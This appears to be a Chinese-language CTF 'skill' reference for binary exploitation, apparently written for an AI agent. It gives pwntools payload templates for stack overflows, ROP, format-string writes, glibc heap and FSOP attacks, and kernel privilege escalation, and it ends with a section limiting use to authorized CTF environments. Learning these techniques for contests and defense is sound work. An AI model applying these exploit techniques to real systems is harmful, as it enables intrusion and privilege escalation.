# Pwn CTF Skill (v9 增强版)

## 解题顺序

1. `checksec` 检查保护 (NX/ASLR/Canary/PIE/RELRO)
2. `file` 确定架构 (32/64, static/dynamic)
3. 逆向关键函数（IDA/Ghidra）
4. 寻找漏洞点（溢出/UAF/格式化字符串）
5. 编写 exploit

## 栈溢出基础

### 偏移计算
```python
from pwn import *
offset = cyclic(200)  # 发送后用 cyclic -l <value> 找偏移
```

### ret2win (带参数)
```python
offset = 120  # buffer + saved rbp
payload = b'A' * offset
payload += p64(ret)          # 栈对齐 (16 字节)
payload += p64(pop_rdi_ret)
payload += p64(0x1337c0decafebeef)  # 魔法值参数
payload += p64(win_func)
```

### 栈对齐
```text
Ubuntu/glibc 要求 call 前 RSP 16 字节对齐
症状: SIGSEGV 在 movaps 指令
修复: 加额外 ret gadget
```

### 隐藏 Gadget (CMP 立即数)
```asm
cmpl $0xc35e415f, -0x4(%rbp)
; 字节: 81 7d fc 5f 41 5e c3
; +3: 5f 41 5e c3 = pop rdi; pop r14; ret
```

### 结构体指针覆写
```c
struct Student { char name[36]; int *grade_ptr; float gpa; };
// 溢出 name → 覆写 grade_ptr → 修改 GOT
payload = b'A' * 36 + p32(GOT_TARGET)
modify_grade(0, str(WIN))  # 写入 GOT
```

### Canary 字节爆破 (Fork 服务器)
```python
canary = b'\x00'  # 第 0 字节总是 0x00
for byte_pos in range(1, 8):
    for guess in range(256):
        if try_byte(canary, guess):  # 不崩溃 = 正确
            canary += bytes([guess])
            break
# 最多 7*256 = 1792 次尝试
```

### Canary NULL 字节覆写泄露
```text
# 覆写 canary 最低字节为 \x00 → printf 打印到 \x00 停止 → 泄露 canary
# 恢复: 重新覆写正确 canary + ROP
```

### 返回地址最低字节覆写
```text
# 单字节覆写 return address 的 LSB → 跳转到同页内不同指令
# PIE 场景: 同页内有多个有用 gadget
```

---

## ROP

### ret2libc (两阶段)
```python
# 阶段 1: 泄露 libc 地址
payload = b'A' * offset
payload += p64(pop_rdi_ret) + p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(main)         # 返回 main 做第二次攻击

# 接收泄露地址
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']

# 阶段 2: system("/bin/sh")
payload2 = b'A' * offset
payload2 += p64(ret)         # 栈对齐
payload2 += p64(pop_rdi_ret) + p64(next(libc.search(b'/bin/sh')))
payload2 += p64(libc.symbols['system'])
```

### ret2csu (通用 gadget)
```asm
; __libc_csu_init 尾部:
pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
mov rdx, r14; mov rsi, r13; mov edi, r15d; call [r12+rbx*8]
```

### SROP (Sigreturn Oriented Programming)
```python
from pwn import *
frame = SigreturnFrame()
frame.rax = 0x3b      # execve syscall
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret
frame.rsp = new_stack

payload = b'A' * offset
payload += p64(pop_rax_ret) + p64(15)  # sigreturn syscall number
payload += p64(syscall_ret)
payload += bytes(frame)
```

### 双栈迁移到 BSS
```python
# leave; ret → RSP = [RBP], RBP = [RBP-8]
# 两次 leave; ret 实现任意栈迁移
new_rbp = bss_addr + 0x800
payload = b'A' * offset + p64(new_rbp) + p64(leave_ret)
# 第二阶段: 在 BSS 上构造 ROP chain
```

### One Gadget
```bash
one_gadget /path/to/libc.so
# 找到 execve('/bin/sh', NULL, NULL) 的单 gadget
# 注意约束条件 (rsp+X 可访问, r12=NULL 等)
```

---

## 格式化字符串

### 基本
```python
# %p 泄露栈数据
# %n 写入 (4 字节), %hn (2), %hhn (1)
# %<offset>p 泄露特定偏移
```

### 任意地址写入
```python
# 目标: 写 0xdeadbeef 到地址 0x804a000
payload = p32(0x804a000)    # 目标地址在栈上
payload += b'%3735929438c'  # 0xdeadbeef - 4 (已打印4字节地址)
payload += b'%7$n'          # 偏移7处是目标地址
```

### GOT 覆写
```python
payload = fmtstr_payload(offset, {elf.got['printf']: win_addr})
p.sendline(payload)
```

### 64 位格式化字符串
```python
# 前 6 个参数在寄存器 (rdi, rsi, rdx, rcx, r8, r9)
# rdi = 格式化字符串本身 → 从第 6 个偏移开始
# 栈参数从偏移 7 开始
```

---

## 堆利用

### 堆基础
```text
glibc 堆结构:
- fastbin: < 0x80 (64-bit), 单链表 LIFO
- tcache: < 0x410 (glibc 2.26+), 每大小 7 条
- unsorted bin: 释放后先进入, FIFO
- small/large bin: 按 size 排序

关键字段:
- prev_size (0x10 前一个块大小, 仅空闲时有效)
- size (0x8 当前块大小 + 标志位: A|M|P)
- fd/bk (空闲时: 双链表指针)
```

### tcache poisoning
```python
# 双释放 (glibc 2.26-2.31 无 tcache double-free 检查):
free(A); free(B); free(A)  # → tcache: A → B → A
# 分配时写入 A 的 fd → 任意地址分配
malloc(size); malloc(size)
malloc(size)  # 第三次从 A 的 fd 分配 → 任意地址
```

### fastbin dup
```python
# glibc < 2.26: fastbin double-free
free(A); free(B); free(A)  # → A → B → A
# 覆写 A 的 fd → 任意地址 (需 size 字段匹配)
```

### unsafe unlink
```python
# glibc < 2.29: 伪造堆块的 fd/bk
# fd = &target - 0x18, bk = &target - 0x10
# unlink: *(fd + 0x18) = bk, *(bk + 0x10) = fd
```

### Unsorted Bin Leak
```python
# 释放大于 fastbin 的块 → fd/bk 指向 main_arena (libc 内)
# 读取 fd/bk → 计算 libc base
```

### House of Force
```python
# 覆写 top chunk size 为 -1 → 任意大 malloc → 任意地址分配
```

### House of Orange
```python
# 无 free 调用: 覆写 top chunk → _int_free → FSOP
```

### House of Apple 2 (glibc 2.34+)
```python
# FSOP via _IO_wfile_overflow → _IO_wdoalloc → _IO_WDOALLOCATE
# 构造伪造 _IO_FILE + wide data → 控制 vtable
# setcontext 变体
```

### tcache key 绕过 (glibc 2.32+)
```text
# glibc 2.32+: tcache 添加 key 检测 double-free
# 绕过: 覆写 key 字段 (UAF 或溢出) → 重新释放
```

### UAF (Use-After-Free)
```python
# 释放后仍持有指针 → 读写已释放的堆块
# 1. 泄露: 读取 freed chunk 的 fd/bk
# 2. 控制: 修改 freed chunk 的 fd/bk → 任意地址分配
```

---

## _IO_FILE / FSOP

### FILE 结构体
```python
# _IO_FILE 关键字段偏移:
# _flags (0x00), _IO_write_base (0x20), _IO_write_ptr (0x28)
# _fileno (0x70), _lock (0x88), vtable (0xd8)
```

### vtable 劫持
```python
# glibc < 2.24: 直接覆写 vtable → 调用任意函数
# glibc 2.24+: vtable 验证 → 用 _IO_wfile_jumps 等合法 vtable
# House of Apple 2: _IO_wfile_overflow → _IO_WDOALLOCATE
```

### FSOP
```python
# exit() → _IO_flush_all_lockp → 遍历 _IO_list_all
# 伪造 _IO_FILE 链 → 触发 _IO_OVERFLOW
# 条件: _flags & _IO_CURRENTLY_PUTTING || _flags & _IO_UNBUFFERED
# _IO_write_base < _IO_write_ptr
```

---

## 内核 Pwn

### QEMU 调试环境
```bash
qemu-system-x86_64 -kernel bzImage -initrd rootfs.cpio \
  -append "console=ttyS0 root=/dev/ram0" -nographic \
  -gdb tcp::1234 -S
# gdb: target remote :1234
```

### 基本利用流程
```text
1. 解包 rootfs.cpio → 找漏洞模块 (.ko)
2. 逆向 .ko → 找漏洞函数 (ioctl handler)
3. 确认保护: SMEP/SMAP/KASLR
4. open("/dev/device") → ioctl(fd, CMD, arg)
5. 提权: commit_creds(prepare_kernel_cred(0))
6. 返回用户态: swapgs; iretq → system("/bin/sh")
```

### modprobe_path
```python
# 覆写 modprobe_path → 执行未知格式文件 → 触发恶意脚本
```

### bypass SMEP/SMAP
```text
SMEP: ROP 绕过 (不在用户态执行代码)
SMAP: copy_from_user 先拷到内核
翻转 CR4: mov cr4, 0x6f0
```

---

## 高级技巧

### Seccomp 绕过
```python
# openat2 绕过 open 限制
# openat(AT_FDCWD, pathname, flags)
```

### ORW (Open-Read-Write) Chain
```python
# seccomp 限制 execve → 只能读取文件
payload += open("/flag") → read(fd, buf, len) → write(1, buf, len)
```

### PWNTOLS 快速参考
```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
elf = ELF('./binary')
libc = ELF('./libc.so')
p = process('./binary')     # 本地
p = remote('target', 1337) # 远程
rop = ROP(elf)              # 自动找 gadget
shellcraft.sh()             # 生成 shellcode
cyclic(200)                 # 找偏移
```

## 安全边界

- 不连接非授权的远程服务
- 不攻击本地系统程序
- 只在授权 CTF 环境中操作
